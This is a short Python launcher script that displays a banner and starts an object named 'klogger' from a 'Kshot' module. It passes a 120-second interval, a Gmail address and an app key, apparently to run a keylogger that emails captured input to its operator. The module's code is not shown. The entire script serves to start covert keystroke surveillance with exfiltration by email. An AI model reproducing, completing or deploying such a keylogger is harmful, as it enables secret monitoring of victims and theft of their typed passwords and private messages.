#!/usr/bin/python
from banner import Banner
from kshot import Kshot

logo = Banner()
logo.show()

klogger = Kshot(120, "you@gmail.com", "yourAppKey")
klogger.run()
